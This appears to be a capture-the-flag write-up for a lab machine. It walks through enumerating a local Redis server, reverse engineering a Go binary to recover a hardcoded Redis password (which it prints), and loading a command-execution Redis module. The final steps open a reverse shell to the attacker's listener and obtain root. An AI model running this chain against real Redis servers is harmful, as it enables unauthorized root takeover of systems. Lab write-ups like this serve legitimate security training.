
## Todos

- [x] `redis` port open
- [x] `sysadmin` group
	- [x] `/usr/local/bin/redis_connector_dev`
		- [x] Purpose
		- [x] Reverse engineer

---

## `redis` Port Open

```bash
james_mason@shared:~$ ps auxef
...
root        4126  0.5  0.7  65104 14972 ?        Ssl  15:53   0:00 /usr/bin/redis-server 127.0.0.1:6379
...
```

```bash
james_mason@shared:~$ ss -antl
State             Recv-Q            Send-Q                       Local Address:Port                         Peer Address:Port            Process
LISTEN            0                 80                          127.0.0.1:6379                              0.0.0.0:*
...
```

```bash
james_mason@shared:~$ file /usr/bin/redis-server
/usr/bin/redis-server: symbolic link to redis-check-rdb
james_mason@shared:~$ which redis-check-rdb
/usr/bin/redis-check-rdb
james_mason@shared:~$ file /usr/bin/redis-check-rdb
/usr/bin/redis-check-rdb: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554423c28bc7751c9fc558bccd0874d1981d68af, for GNU/Linux 3.2.0, stripped
```

Authentication is required to interact with the `redis` server. `james_mason`:`Soleil101` doesn't work.

```bash
127.0.0.1:6379> AUTH james_mason Soleil101
(error) WRONGPASS invalid username-password pair
```

---
## `sysadmin` Group

`dan_smith` is a member of the non-standard `sysadmin` group.

```bash
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

```bash
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null
/usr/local/bin/redis_connector_dev
dan_smith@shared:~$ ls -la /usr/local/bin/redis_connector_dev
-rwxr-x--- 1 root sysadmin 5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
```

### `redis_connector_dev`

```bash
dan_smith@shared:~$ file /usr/local/bin/redis_connector_dev
/usr/local/bin/redis_connector_dev: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=sdGIDsCGb51jonJ_67fq/_JkvEmzwH9g6f0vQYeDG/iH1iXHhyzaDZJ056wX9s/7UVi3T2i2LVCU8nXlHgr, not stripped
```

Some research indicates that `redis_connector_dev` is a non-standard application. According to `file`, it is a 64-bit non-stripped Go ELF binary.

#### Purpose

Upon execution, it appears to log into the `redis` server, issue the `INFO` command, and return the response.

```bash
dan_smith@shared:~$ redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
# Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:1682
run_id:968c4e9c112b843d319490cfa514ea9aee28be77
tcp_port:6379
uptime_in_seconds:6
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:7787988
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
```

Reverse engineer `redis_connector_dev` in order learn the password.

#### Reverse Engineering

Looking through some of the binary's strings, there are several references to [go-redis](https://github.com/go-redis/redis), a popular Go Redis client library.

```bash
$ strings redis_connector_dev
...
github.com/go-redis/redis.(*baseClient).pipelineProcessCmds-fm
github.com/go-redis/redis.(*baseClient).txPipelineProcessCmds-fm
github.com/go-redis/redis.(*baseClient).Process-fm
...
```

According to the Quickstar section of `go-redis`'s README, the `redis.NewClient(redis.Options)` function is used to establish a connection to a `redis` server. The `redis.Options` struct contains the `Password` field.

```go
rdb := redis.NewClient(&redis.Options{
	Addr:     "localhost:6379",
	Password: "", // no password set
	DB:       0,  // use default DB
})
```

Opening the binary in Ghidra and jumping to `main.main`'s assembly, we can see the call to `redis.NewClient(redis.Options)`.

![](images/Pasted%20image%2020221117230822.png)

Note the two `LEA` instructions above this call.

The first loads `DAT_0067171e` into `RCX`. Hovering over this label, we can see its value is `localhost:6379`. This must be the string passed into `redis.Option`'s `Addr` field. Note that just before this `LEA` instruction, there is a `MOV` instruction that sets the length of the string object to 0xe, or 14. This is the length of the `localhost:6379` string.

![](images/Pasted%20image%2020221117231040.png)

The second `LEAD` instruction loads `DAT_00671C55` into `RCX`. The `MOV` instruction that precedes it indicates the string will be 0x10 or 16 bytes long. Hovering over this label, we can see the first 16 bytes from this address are `F2WHqJUz2WEz=Gqq`. This must be the string passed into the `redis.Option`'s `Password` field.

![](images/Pasted%20image%2020221117231607.png)

As `dan_smith` and via the `redis-cli`, confirm the password works.

```bash
127.0.0.1:6379> AUTH F2WHqJUz2WEz=Gqq
OK
```

`pspy` indicated earlier that `redis` is running as `root`. Leverage [n0b0dyCN's ExecuteCommand Redis Module](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) to gain a reverse shell as `root`.

Download the `redis` module and stage it to the target.

```bash
$ git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
Cloning into 'RedisModules-ExecuteCommand'...
remote: Enumerating objects: 494, done.
remote: Counting objects: 100% (117/117), done.
remote: Compressing objects: 100% (17/17), done.
remote: Total 494 (delta 101), reused 100 (delta 100), pack-reused 377
Receiving objects: 100% (494/494), 203.32 KiB | 3.33 MiB/s, done.
Resolving deltas: 100% (289/289), done.

$ cd RedisModules-ExecuteCommand

$ make
make -C ./src
make[1]: Entering directory '/home/tgihf/workspace/htb/boxes/shared/RedisModules-ExecuteCommand/src'
make -C ../rmutil
make[2]: Entering directory '/home/tgihf/workspace/htb/boxes/shared/RedisModules-ExecuteCommand/rmutil'
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o util.o util.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o strings.o strings.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o sds.o sds.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o vector.o vector.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o alloc.o alloc.c
gcc -g -fPIC -O3 -std=gnu99 -Wall -Wno-unused-function -I../   -c -o periodic.o periodic.c
ar rcs librmutil.a util.o strings.o sds.o vector.o alloc.o periodic.o
make[2]: Leaving directory '/home/tgihf/workspace/htb/boxes/shared/RedisModules-ExecuteCommand/rmutil'
gcc -I../ -Wall -g -fPIC -lc -lm -std=gnu99     -c -o module.o module.c
module.c: In function ‘DoCommand’:
module.c:16:29: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   16 |                 char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                             ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:23:29: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:11:1: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
   10 | #include <netinet/in.h>
  +++ |+#include <string.h>
   11 |
module.c:23:29: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   23 |                         if (strlen(buf) + strlen(output) >= size) {
      |                             ^~~~~~
module.c:23:29: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c:27:25: warning: implicit declaration of function ‘strcat’ [-Wimplicit-function-declaration]
   27 |                         strcat(output, buf);
      |                         ^~~~~~
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:27:25: warning: incompatible implicit declaration of built-in function ‘strcat’ [-Wbuiltin-declaration-mismatch]
module.c:27:25: note: include ‘<string.h>’ or provide a declaration of ‘strcat’
module.c:29:80: warning: incompatible implicit declaration of built-in function ‘strlen’ [-Wbuiltin-declaration-mismatch]
   29 |                 RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
      |                                                                                ^~~~~~
module.c:29:80: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
module.c: In function ‘RevShellCommand’:
module.c:41:28: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   41 |                 char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
      |                            ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:42:32: warning: initialization discards ‘const’ qualifier from pointer target type [-Wdiscarded-qualifiers]
   42 |                 char *port_s = RedisModule_StringPtrLen(argv[2], &cmd_len);
      |                                ^~~~~~~~~~~~~~~~~~~~~~~~
module.c:48:38: warning: implicit declaration of function ‘inet_addr’ [-Wimplicit-function-declaration]
   48 |                 sa.sin_addr.s_addr = inet_addr(ip);
      |                                      ^~~~~~~~~
module.c:57:17: warning: argument 2 null where non-null expected [-Wnonnull]
   57 |                 execve("/bin/sh", 0, 0);
      |                 ^~~~~~
In file included from module.c:4:
/usr/include/unistd.h:561:12: note: in a call to function ‘execve’ declared ‘nonnull’
  561 | extern int execve (const char *__path, char *const __argv[],
      |            ^~~~~~
ld -o module.so module.o -shared -Bsymbolic  -L../rmutil -lrmutil -lc
make[1]: Leaving directory '/home/tgihf/workspace/htb/boxes/shared/RedisModules-ExecuteCommand/src'
cp ./src/module.so .

$ scp -i ../dan_smith module.so dan_smith@shared.htb:/home/dan_smith/module.so
module.so                                                                                                                 100%   47KB 628.2KB/s   00:00
```

Start a reverse shell listener.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
```

Authenticate to `redis`, load the module, and execute a reverse shell.

```bash
dan_smith@shared:~$ cat redis-cmds.txt
MODULE LOAD /home/dan_smith/module.so
MODULE LIST
system.exec id
system.rev 10.10.14.40 9000

dan_smith@shared:~$ redis-cli -a 'F2WHqJUz2WEz=Gqq' < redis-cmds.txt
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
OK
1) 1) "name"
   2) "system"
   3) "ver"
   4) (integer) 1
"uid=0(root) gid=0(root) groups=0(root)\n"

```

Catch the shell as `root`.

```bash
$ nc -nlvp 9000
listening on [any] 9000 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.41.137] 50364
id
uid=0(root) gid=0(root) groups=0(root)
ls -la /root/root.txt
-rw-r----- 1 root root 33 Nov 17 19:19 /root/root.txt
```
